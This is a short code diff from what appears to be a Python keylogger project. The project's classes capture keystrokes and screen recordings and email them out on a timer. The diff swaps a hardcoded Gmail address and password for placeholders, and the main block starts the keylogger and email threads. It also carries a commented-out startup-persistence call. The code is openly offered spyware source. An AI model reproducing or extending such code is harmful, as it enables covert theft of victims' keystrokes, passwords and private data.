@@ -179,7 +179,7 @@ class SendEmail(Keylogger, ScreenRecord):
 if __name__ == '__main__':
 
     k = Keylogger()
-    e = SendEmail('pythonkeylogger123321@gmail.com', 'PythonLogger', 5)
+    e = SendEmail('YOUR_EMAIL', 'YOUR_PASSWORD', 5)
     #s = Startup('keylog.py')
     # Make independent threads
     email_thread = threading.Thread(target=e.email)
